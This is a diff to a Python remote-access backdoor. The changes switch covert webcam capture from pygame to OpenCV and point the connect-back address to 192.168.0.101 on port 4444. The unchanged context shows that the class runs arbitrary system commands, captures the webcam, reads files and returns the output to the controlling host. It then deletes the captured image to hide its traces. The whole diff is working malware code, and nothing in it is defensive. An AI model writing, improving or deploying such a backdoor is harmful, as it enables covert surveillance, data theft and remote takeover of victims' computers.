@@ -4,12 +4,10 @@ import os
 import base64
 # os.system("python -m pip install --upgrade pip")
 # os.system("pip3 install mss")
-# os.system("pip3 install pygame")
 # os.system("pip3 install numpy")
 # os.system("pip install opencv-python")
 import mss
-import pygame
-import pygame.camera
+import cv2
 
 
 class Backdoor:
@@ -78,12 +76,10 @@ class Backdoor:
                 elif command.split()[0] == "camera":
                     cam = cv2.VideoCapture(0, cv2.CAP_DSHOW)
                     result, image = cam.read()
-                    if result:
-                         cv2.imwrite("camera.jpg", image)
-                    else:
-                         print("No image detected. Please! try again")
+                    cv2.imwrite("camera.jpg", image)
                     command_result = self.read_file("camera.jpg")
                     os.system("del camera.jpg")
+                    cam.release()
                 else:
                     command_result = self.execute_system_command(command)                                   
                 self.reliable_send(command_result)
@@ -92,7 +88,7 @@ class Backdoor:
                 # self.reliable_send("[-] Something was wrong!")
 
 
-my_backdoor = Backdoor("localhost", 4444)
+my_backdoor = Backdoor("192.168.0.101", 4444)
 my_backdoor.run()
 
 
